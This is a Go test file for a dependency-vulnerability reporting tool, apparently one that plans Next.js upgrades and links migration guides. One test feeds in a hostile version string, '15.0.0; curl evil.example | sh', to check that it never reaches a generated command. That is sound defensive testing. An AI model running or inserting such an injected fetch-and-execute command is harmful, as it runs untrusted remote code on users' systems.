package report

import (
	"slices"
	"testing"

	"github.com/rasoat/rasoat/internal/core"
	"github.com/rasoat/rasoat/internal/data"
)

func TestADownloadedVersionThatIsNotPlainNeverReachesACommand(t *testing.T) {
	hostile, v := "15.0.0; curl evil.example | sh", "14.2.3"
	r := Result{Verdict: core.Verdict{Product: "next", Version: &v, Status: core.Vulnerable, Fix: &hostile, Advisories: []core.VerdictAdvisory{}}, Sources: []string{"package-lock.json"}}
	rep := &Report{Target: Target{"dir", "/x"}, Results: []Result{r}}
	if c := Plan(rep, &data.Loaded{Snapshot: data.Bundled()}).Steps[0].Changes[0].Command; c != nil {
		t.Errorf("command: %s", *c)
	}
}

func TestGuidesFollowTheMajorsCrossedFromTheFirstThatHasOne(t *testing.T) {
	v := "12.3.7"
	got := guides("next", &v, "15.5.28")
	if !slices.Equal(got, []string{"https://nextjs.org/docs/app/guides/upgrading/version-14", "https://nextjs.org/docs/app/guides/upgrading/version-15"}) {
		t.Error(got)
	}
	v = "15.5.1"
	if g := guides("next", &v, "15.5.28"); len(g) != 0 {
		t.Error(g)
	}
	v = "18.0.0"
	if g := guides("node", &v, "22.0.0"); len(g) != 0 {
		t.Error(g)
	}
}
